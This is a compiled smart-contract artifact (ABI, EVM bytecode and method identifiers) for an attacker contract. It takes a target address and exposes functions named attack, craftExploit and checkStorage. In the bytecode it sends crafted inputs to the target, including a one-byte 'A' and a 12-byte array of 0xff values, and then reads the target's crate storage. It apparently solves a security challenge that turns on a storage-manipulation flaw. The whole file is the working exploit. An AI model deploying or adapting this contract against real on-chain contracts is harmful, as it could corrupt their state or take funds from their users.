{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"checkStorage","inputs":[{"name":"crateId","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"craftExploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161047a38038061047a833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6103f4806100865f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c806303b6a35c146100435780639e5faafc14610068578063c37f7b2014610072575b5f5ffd5b610056610051366004610318565b61007a565b60405190815260200160405180910390f35b610070610111565b005b610070610233565b5f80546040517f93684bd40000000000000000000000000000000000000000000000000000000081526004810184905273ffffffffffffffffffffffffffffffffffffffff909116906393684bd490602401602060405180830381865afa1580156100e7573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061010b919061032f565b92915050565b5f54604051632acee48960e21b815260206004820152600160248201527f4100000000000000000000000000000000000000000000000000000000000000604482015273ffffffffffffffffffffffffffffffffffffffff9091169063ab3b9224906064015f604051808303815f87803b15801561018d575f5ffd5b505af115801561019f573d5f5f3e3d5ffd5b50505f8054604080517f932289cc000000000000000000000000000000000000000000000000000000008152600481019190915260448101839052602481019290925273ffffffffffffffffffffffffffffffffffffffff16925063932289cc91506064015f604051808303815f87803b15801561021b575f5ffd5b505af115801561022d573d5f5f3e3d5ffd5b50505050565b60408051600c8082528183019092525f916020820181803683370190505090505f5b600c8110156102ab5760ff60f81b82828151811061027557610275610346565b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a905350600101610255565b505f54604051632acee48960e21b815273ffffffffffffffffffffffffffffffffffffffff9091169063ab3b9224906102e8908490600401610373565b5f604051808303815f87803b1580156102ff575f5ffd5b505af1158015610311573d5f5f3e3d5ffd5b5050505050565b5f60208284031215610328575f5ffd5b5035919050565b5f6020828403121561033f575f5ffd5b5051919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b602081525f82518060208401525f5b8181101561039f5760208186018101516040868401015201610382565b505f604082850101526040601f19601f8301168401019150509291505056fea26469706673582212205a48b06ee2f5fed79c433ec0551e32e189bba795a126a04cbd1b7853f070fa8164736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","checkStorage(uint256)":"03b6a35c","craftExploit()":"c37f7b20"},"id":0}